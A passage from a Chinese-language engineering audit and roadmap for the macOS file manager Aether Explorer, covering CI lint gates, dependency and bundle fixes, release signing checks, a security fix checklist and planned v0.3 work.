- 前端 ESLint 门禁禁止浏览器 `prompt/alert/confirm`，限制业务代码 `console.log/debug`，允许明确用于诊断输出的 `console.info/warn/error/group/groupEnd/table`，并启用基础 React Hooks / React Refresh 检查。
- `SettingsView` 的设置导入、重置和扩展删除确认已迁移到 Tauri dialog，避免继续使用浏览器 `confirm`。
- `npm run lint:ci-gates` 已检查 `lint` 必须串联 `lint:ts` / `lint:eslint`，并检查 `lint:eslint` 仍运行 ESLint，防止 CI 回退成纯 `tsc`。
- `npm run lint:ci-gates` 已检查 `build` / `clean:release` / `test` / `lint:ts` / `lint:eslint` / `lint:readme` / `lint:i18n` / `lint:ci-gates` / `lint:rust` / `test:rust` 仍指向真实检查器或真实命令，防止关键 npm scripts 被改成空命令。
- `npm run lint:ci-gates` 已检查 test workflow 覆盖 `main`、`feat/**`、`fix/**`、`test/**`、`codex/**` 与 `codex-*` 分支 push，并保留 `pull_request` 到 `main` 的触发，确保声明的 push 分支和 PR 都不会绕过 CI。
- `npm run lint:ci-gates` 已分别检查 test workflow、release `test-gate` 和 release job 保留 Node 20、npm cache、`npm ci`、Rust cache，以及 release universal targets，防止任一 job 的 CI 环境准备退化后造成不可复现的失败。
- `npm run lint:ci-gates` 已检查 test workflow、release `test-gate` 和 release job 保留明确的 `timeout-minutes`，防止 CI / release job 被误改成无限等待。
- `npm run lint:ci-gates` 已检查 release workflow 保留 `v*` tag 触发、`workflow_dispatch` 手动触发，以及必填的 `tag_name` 参数，防止发布入口被误删。
- `npm run lint:ci-gates` 已检查 release workflow 保留 `contents: write`、Tauri updater 签名密钥注入 / 缺失校验和 `GITHUB_TOKEN` 上传权限，防止发布权限或签名前置检查被误删。
- `npm run lint:ci-gates` 已检查本地 `scripts/release.sh` 保留私钥路径、`jq`、`gh`、`gh auth` 和 Tauri updater 签名密钥导出等前置校验，防止本地发版安全条件被误删。
- `npm run lint:ci-gates` 已检查 release workflow 和本地 `scripts/release.sh` 仍通过 `npx @tauri-apps/cli build --target universal-apple-darwin` 构建，并优先读取 universal bundle 目录，防止回退成半成品上传或非 universal 构建。
- `npm run lint:ci-gates` 已检查 release workflow 和本地 `scripts/release.sh` 的 `.dmg` / `.app.tar.gz` / `.sig` 查找逻辑会容忍缺失目录并落到明确的 missing artifact 诊断，防止 `set -euo pipefail` 下提前中断而隐藏根因。
- `npm run lint:ci-gates` 已检查 release job 必须 `needs: test-gate`，防止保留测试 job 但绕过门禁直接发版。
- `npm run lint:ci-gates` 已检查 release workflow 和本地 `scripts/release.sh` 保留 tag / package / lock / Tauri / Cargo 版本一致性校验，防止发布脚本退化成只看单一版本源。
- `npm run lint:ci-gates` 已单独检查本地 `scripts/release.sh` 的 release gate（lint / docs / i18n / gate / Vitest / Rust test / clippy / build），确保本地发版不会弱于 CI。
- `npm run lint:ci-gates` 当前验证 8 个 test gates、8 个 release gates、8 个 local release gates、15 个 npm script 实现、3 个 dependency resolution checks、19 个 CI setup checks、3 个 timeout checks、6 个工作分支触发、1 个 PR 目标触发、6 个 release trigger checks、13 个 release security checks、11 个版本一致性检查和 release integrity 检查。
- Rust 侧已新增 `npm run lint:rust`，执行 `cargo clippy --lib -- -D warnings`。
- GitHub Actions test workflow 和 release `test-gate` 已安装 `clippy` component 并运行 `npm run lint:rust`。
- `npm run lint:ci-gates` 已检查 `lint:rust`、`components: clippy` 和 release / test gate 中的 Rust lint 步骤，防止被误删。

**剩余优化**：

- `ExplorerView` 的拖拽、外部导入、键盘快捷键和刷新链路已按 latest-ref / stable callback 模式收口，`npm run lint` 当前无 `react-hooks/exhaustive-deps` warning。
- `react-hooks/exhaustive-deps` 和 `react-hooks/rules-of-hooks` 均保持 error，并纳入 `lint:ci-gates` 检查，防止 CI 回退成允许历史 warning 或破坏 Hooks 基本规则。
- 后续仍建议结合 `ExplorerView` 拆分补组件级 / 集成测试，覆盖拖拽、导入、快捷键和刷新链路的真实交互行为。

### P3-26 异常依赖版本 — 已收口

**当前状态**：
- `package-lock.json` 当前解析 `@vitejs/plugin-react` 为 5.x，证明 `package.json` 中的 `^5.0.4` 可解析，不再按伪造依赖处理。
- `vite` 仅保留在 `devDependencies`，未同时出现在 `dependencies`，避免运行时依赖和构建依赖混放。
- `motion` 当前解析为 12.x，现有 UI 动效链路仍依赖 `motion/react`；reduced-motion 已另行收口，暂不做大版本降级。
- `npm run lint:ci-gates` 已检查 `@vitejs/plugin-react`、`motion` 和 `vite` 的 lockfile 主版本解析，并检查 `vite` 只存在于 `devDependencies`，防止依赖清单回退。

### P3-26A production build 主 chunk 过大 — 已收口

**当前状态**：
- `vite.config.ts` 已通过 `build.rollupOptions.output.manualChunks` 拆出 `vendor-react`、`vendor-tauri`、`vendor-icons`、`vendor-i18n` 和通用 `vendor`。
- `npm run build` 当前主入口 chunk 从约 683 KB 降到约 258 KB，低于 Vite 500 KB warning 阈值。
- `SettingsView`、`StorageView`、`TransferModal` 继续保持 `React.lazy` 拆分。

**剩余优化**：
- i18n locale 动态加载。
- 后续结合 `ExplorerView` 拆分进一步降低首屏业务 chunk。

### P3-27 `scripts/dev.mjs` 不清理临时 config

**修复**：
```js
import { rmSync } from 'node:fs';

process.on('exit', () => {
  try { rmSync(tempDir, { recursive: true, force: true }); } catch {}
});
process.on('SIGINT', () => process.exit(0));
```

### P3-28 `gen/`、`dist/` 等构建产物管控

**修复**：release workflow 和本地 `scripts/release.sh` 在打包前执行 `npm run clean:release`，清理 `dist`、`src-tauri/target/release/bundle` 与 `src-tauri/target/universal-apple-darwin/release/bundle`，确保产物来自干净构建。

---

## 🛑 P-DEF：项目定位 / 决策层

### DEF-29 "Finder 替代品"定位拉扯

**问题**：README 说"兼具 Finder 的操作能力"+"这不是系统替换"，用户搞不清要不要切过来用。竞品（Path Finder / ForkLift / Commander One）每家都有一句话清晰差异化。

**修复方向**：
- 选一个**单点突破**作为 Aether 的卖点（候选：玻璃质感/M3 设计；多窗口/标签页拖拽；可扩展右键菜单；中文优先 i18n）
- README 第一句改为"Aether Explorer 是 macOS 上**唯一的 XXX 文件管理器**"
- 把竞品对比表放在 README 第二屏

### DEF-30 Dock 菜单实际是误用 `app.set_menu`

**位置**：`src-tauri/src/lib.rs`，历史注释自述"使用 app.set_menu 而不是 set_dock_menu"

**问题**：`set_menu` 设的是 App 菜单栏，不是 Dock 右键菜单。

**修复**：
- 升 Tauri 到支持 `set_dock_menu` 的版本（或调用底层 `objc` 直接设 `NSApp.dockTile.menu`）
- 在改好之前 FEATURES Tier 10.3 状态改回 ⏳，不要写 ✅

### DEF-31 Updater 不可回滚 + 无 staged rollout + 无 kill switch

**修复方向**（v0.3 路线图）：
- updater 保留前一版 `.app.tar.gz`，新增"回滚到上一版"功能
- manifest 加 `min_version` 字段：低于此版本必须升级，便于强制回滚损坏版本
- CDN 加 `versions-blacklist.json`，启动时拉取，命中提示卸载

### DEF-32 隐私 / 遥测 / 外发请求面

**修复方向**：
- [x] 新增 `docs/PRIVACY.md`：列出所有出网点（updater / 壁纸 URL / `shellOpen` 的链接）
- `wallpaperUrl` 加"该 URL 每次启动会被请求一次"提示
- 设置加"严格隐私模式"：禁用所有非更新检查的出网

---

## 公益分发前红线检查清单

当前分发不以商业化、App Store 或 notarization 为前提；但发版候选权限验收必须具备稳定签名身份，并通过 clean-user FDA evidence gate。发版前必须保证：

- [x] P0-1 终端命令注入修复（`apple_quote` 已接入，`validate_shell_fragment` 有 Rust 单测覆盖）
- [x] P0-2 shell.open 协议白名单（前端统一 `safeShellOpen`，Tauri `plugins.shell.open` 限定 http/https/mailto）
- [x] P0-3 CSP + 敏感文件预览黑名单
- [x] P0-4 `prompt()` 替换为 dialog + 路径规范化
- [x] P0-5 Updater endpoint 稳定 URL + prerelease 守卫（移除 GitHub `latest` fallback，release workflow 与本地 release 脚本校验 tag / package / lock / Tauri / Cargo 版本，并上传 / 验收 `SHA256SUMS`）
- [x] ACK-6 未签名 / ad-hoc 构建风险已在 README / 路线图中明确说明，不包装成正式签名应用或 FDA release evidence
- [x] ACK-7 完全磁盘访问不要空口承诺；失败必须能通过结构化错误解释
- [x] P1-8 console.log drop
- [x] P1-9 跨设备移动安全降级为复制并保留源
- [x] P1-10 符号链接处理
- [x] P1-11 外置盘删除明确告知
- [x] P1-15 模板插值 shell 转义
- [x] P2-16 package.json / Cargo.toml 元数据修正
- [x] P2-17 删除 AI Studio 残留
- [x] P2-18 删除未使用依赖
- [x] P2-19 SECURITY.md / CONTRIBUTING.md / issue templates
- [x] README 中英文自动同步检查
- [x] P1-12 `list_directory` async + cooperative cancellation + Loader
- [x] P1-13 settings migrator + storeReady 顺序修正
- [x] P1-14 ExplorerView / AIRenamePanel 高风险 i18n + 限定 CI 检查
- [x] P2-20 / 21 / 22 文档状态校准
- [x] FEATURES.md 重新打分（不再用 ✅ 掩盖 ⏳）

## 后续 0.3.x 治理项

- [x] P1-14 SettingsView i18n 后续收口（分类 / 页头 / 权限 / 扩展 / 清理缓存高风险文案已接入 `settings.*`，`lint:i18n` 防回退）

## v0.3 路线图

- [ ] P3-23 ExplorerView 拆分
- [ ] P3-24 组件级 / 集成测试覆盖
- [x] P3-25 ESLint 接入 CI
- [x] P3-25A ExplorerView hooks warning 清零并升级为 error 门禁
- [ ] DEF-29 定位单点突破
- [ ] DEF-30 真实 Dock 菜单
- [ ] DEF-31 updater 回滚 + staged rollout
- [ ] DEF-32 严格隐私模式

---

## 一句话结语

> 当前版本已经补齐多项 P0/P1 信任红线，但仍应以"公益社区预览版"的口吻分发；未签名 / ad-hoc 构建不能包装成商业级签名应用，也不能作为稳定 Full Disk Access release evidence。
> 一旦有人因 P0-1/2/4 受损并发到 Hacker News，整个项目信誉会一次性烧光，
> 且如果缺少稳定更新、回滚和风险提示链路，紧急修复也难以及时触达用户。先把红线清单做完，再扩大下载入口。
